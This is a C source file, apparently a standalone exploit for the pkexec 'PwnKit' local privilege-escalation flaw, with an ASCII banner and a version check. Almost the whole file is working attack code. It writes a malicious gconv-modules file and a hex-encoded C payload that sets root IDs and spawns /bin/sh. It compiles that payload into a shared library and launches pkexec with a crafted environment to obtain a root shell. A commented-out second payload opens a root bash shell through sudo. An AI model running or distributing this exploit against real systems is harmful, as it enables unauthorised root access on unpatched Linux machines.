/*author: BinaryChunk*/
#define GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>


#define PATH "/usr/bin/pkexec"
#define COMPILE "/usr/bin/gcc"

int vulnerable = 1;

void banner(void) __attribute__((constructor));

void banner(void){
	char *banner = "\n"
			"██████╗ ██╗    ██╗███╗   ██╗ ██╗  ██╗██╗████████╗████████╗██╗   ██╗\n"
			"██╔══██╗██║    ██║████╗  ██║ ██║ ██╔╝██║╚══██╔══╝╚══██╔══╝╚██╗ ██╔╝\n"
			"██████╔╝██║ █╗ ██║██╔██╗ ██║ █████╔╝ ██║   ██║      ██║    ╚████╔╝\n"
			"██╔═══╝ ██║███╗██║██║╚██╗██║ ██╔═██╗ ██║   ██║      ██║     ╚██╔╝\n"
			"██║     ╚███╔███╔╝██║ ╚████║ ██║  ██╗██║   ██║      ██║      ██║\n"
			"╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝      ╚═╝\n";
	puts(banner);

}

void sighandler(int signum){
	fprintf(stderr, "[-] An error ^above^ occured during [execution]\n\n");
	exit(1);
}

int check_conditions(void){
	// a function to make sure that all conditions are met.
	int pipefd[2];
	char version[20];

	if (pipe(pipefd) < 0){
		kill(getpid(), SIGINT);
	}

	pid_t pid = fork();

	if (pid < 0){kill(getpid(), SIGINT);}

	if (!pid){
		close(pipefd[0]);
		dup2(pipefd[1], STDOUT_FILENO);

		char *args[] = {PATH, "--version", NULL};
		execv(PATH, args);
	}else{
	
		wait(NULL); 
		close(pipefd[1]);
		read(pipefd[0], version, sizeof(version));

		char *token = strtok(version, "\x20");

		for(int i = 0;i < 2;i++){
			token = strtok(NULL, "\x20");
		}

		if ((strcmp(token, "0.120")) < 0){
			fprintf(stdout, "[+] this is a vulnerable application\n");
		}else{
			fprintf(stderr, "[-] this [v]ersion is not vulnerable\n");
			vulnerable = 0;
		}
		
		return vulnerable;
	}

}

void exploit(void){
	int fd;
	char *args[] = {COMPILE, "-shared", "-fPIC", "-o", "./tmp/preload.so", "./tmp/preload.c", NULL};
	char *pkexec_args[] = {NULL};
	char *pkexec_envp[] = {"tmp", "CHARSET=EXPLOIT", "SHELL=xxx", "PATH=GCONV_PATH=.", NULL};

	char buffer[] = {
		0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x20,
		0x55, 0x54, 0x46, 0x2d, 0x38, 0x2f, 0x2f,
		0x20, 0x45, 0x58, 0x50, 0x4c, 0x4f, 0x49,
		0x54, 0x2f, 0x2f, 0x20, 0x70, 0x72, 0x65,
		0x6c, 0x6f, 0x61, 0x64, 0x20, 0x32
		};

	char code[] = {0x23, 0x69, 0x6e, 0x63, 0x6c, 0x75, 0x64, 0x65, 0x20, 0x3c, 0x73, 0x74, 0x64, 0x6c, 0x69, 0x62, 0x2e, 0x68, 0x3e, 0xa, 0x23, 0x69, 0x6e, 0x63, 0x6c, 0x75, 0x64, 0x65, 0x20, 0x3c, 0x75, 0x6e, 0x69, 0x73, 0x74, 0x64, 0x2e, 0x68, 0x3e, 0xa, 0xa, 0x76, 0x6f, 0x69, 0x64, 0x20, 0x67, 0x63, 0x6f, 0x6e, 0x76, 0x28, 0x29, 0x7b, 0x7d, 0xa, 0xa, 0x76, 0x6f, 0x69, 0x64, 0x20, 0x67, 0x63, 0x6f, 0x6e, 0x76, 0x5f, 0x69, 0x6e, 0x69, 0x74, 0x28, 0x29, 0x7b, 0xa, 0x9, 0x73, 0x65, 0x74, 0x72, 0x65, 0x75, 0x69, 0x64, 0x28, 0x30, 0x2c, 0x20, 0x30, 0x29, 0x3b, 0xa, 0x9, 0x73, 0x65, 0x74, 0x67, 0x69, 0x64, 0x28, 0x30, 0x29, 0x3b, 0xa, 0x9, 0x65, 0x78, 0x65, 0x63, 0x76, 0x65, 0x28, 0x22, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x22, 0x2c, 0x20, 0x4e, 0x55, 0x4c, 0x4c, 0x2c, 0x20, 0x4e, 0x55, 0x4c, 0x4c, 0x29, 0x3b, 0xa, 0x7d, 0xa};
	//char code[] = {0x23, 0x69, 0x6e, 0x63, 0x6c, 0x75, 0x64, 0x65, 0x20, 0x3c, 0x73, 0x74, 0x64, 0x6c, 0x69, 0x62, 0x2e, 0x68, 0x3e, 0xa, 0x23, 0x69, 0x6e, 0x63, 0x6c, 0x75, 0x64, 0x65, 0x20, 0x3c, 0x75, 0x6e, 0x69, 0x73, 0x74, 0x64, 0x2e, 0x68, 0x3e, 0xa, 0xa, 0x76, 0x6f, 0x69, 0x64, 0x20, 0x67, 0x63, 0x6f, 0x6e, 0x76, 0x28, 0x29, 0x7b, 0x7d, 0xa, 0xa, 0x76, 0x6f, 0x69, 0x64, 0x20, 0x67, 0x63, 0x6f, 0x6e, 0x76, 0x5f, 0x69, 0x6e, 0x69, 0x74, 0x28, 0x29, 0x7b, 0xa, 0x9, 0x73, 0x65, 0x74, 0x72, 0x65, 0x75, 0x69, 0x64, 0x28, 0x30, 0x2c, 0x30, 0x29, 0x3b, 0xa, 0x9, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x28, 0x22, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x75, 0x64, 0x6f, 0x20, 0x2d, 0x75, 0x20, 0x72, 0x6f, 0x6f, 0x74, 0x20, 0x2d, 0x69, 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x22, 0x29, 0x3b, 0xa, 0x7d, 0xa};


	// This is where we try and exploit the vulnerability
	mkdir("GCONV_PATH=.", 0755);

	if ((open("GCONV_PATH=./tmp", O_CREAT|O_WRONLY, 0755)) < 0){
		fprintf(stderr, "[-] there was an error creating 'tmp' file\n");
		kill(getpid(), SIGINT);
	}

	mkdir("tmp", 0755);

	fd = open("./tmp/gconv-modules", O_CREAT|O_WRONLY, 0755);
	if (fd < 0){
		fprintf(stderr, "[-] there was an error creating the file 'gconv-modules'");
		kill(getpid(), SIGINT);
	}
	write(fd, buffer, sizeof(buffer));
	close(fd);

	fd = open("./tmp/preload.c", O_CREAT|O_WRONLY, 0644);
	if (fd < 0){
		fprintf(stderr, "[-] there was an error creating the file 'preload.c'");
		kill(getpid(), SIGINT);
	}
	write(fd, code, sizeof(code));
	close(fd);

	printf("[+] creating a shared library 'preload.so'\n");

	pid_t child_pid = fork();

	if (child_pid < 0){
		fprintf(stderr, "[-] Error creating the child_process");
		kill(getpid(), SIGINT);
	}
	if (child_pid == 0){
		execv(COMPILE, args);
	}else{
		wait(NULL);
		fprintf(stdout, "[+] Executing the 'payload'..\n\n");
		execve(PATH, pkexec_args, pkexec_envp);
	}


}

int main(int argc, char **argv){
	chdir("/tmp");
	signal(SIGINT, sighandler);
	signal(SIGSEGV, sighandler); // This is triggered when setuid-bit is not set for the binary.
	if(check_conditions()){
		exploit();
	}else{
		kill(getpid(), SIGINT);
	}
	return 0;
}
